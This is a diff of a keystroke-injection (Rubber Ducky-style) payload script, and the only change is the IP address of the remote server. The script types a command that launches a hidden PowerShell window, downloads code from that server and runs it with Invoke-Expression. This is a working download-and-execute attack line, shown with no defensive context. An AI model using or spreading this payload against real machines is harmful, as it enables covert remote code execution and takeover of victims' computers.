@@ -4,7 +4,7 @@ STRING powershell
 DELAY 500
 ENTER
 DELAY 500
-STRING Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"(Invoke-WebRequest -Uri http://10.16.20.23/).Content | IEX`"" -PassThru
+STRING Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"(Invoke-WebRequest -Uri http://10.16.20.40/).Content | IEX`"" -PassThru
 ENTER
 DELAY 1000
 STRING exit
